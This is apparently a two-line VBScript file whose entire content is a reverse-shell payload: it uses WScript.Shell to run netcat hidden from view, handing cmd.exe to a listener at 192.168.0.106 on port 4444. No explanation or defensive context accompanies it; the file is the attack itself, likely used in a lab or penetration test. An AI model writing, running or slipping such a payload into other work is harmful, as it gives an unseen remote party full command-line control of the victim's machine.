Set WShell = CreateObject("WScript.Shell")
WShell.Run "cmd.exe /c C:\Windows\System32\nc.exe -e cmd.exe 192.168.0.106 4444", 0, False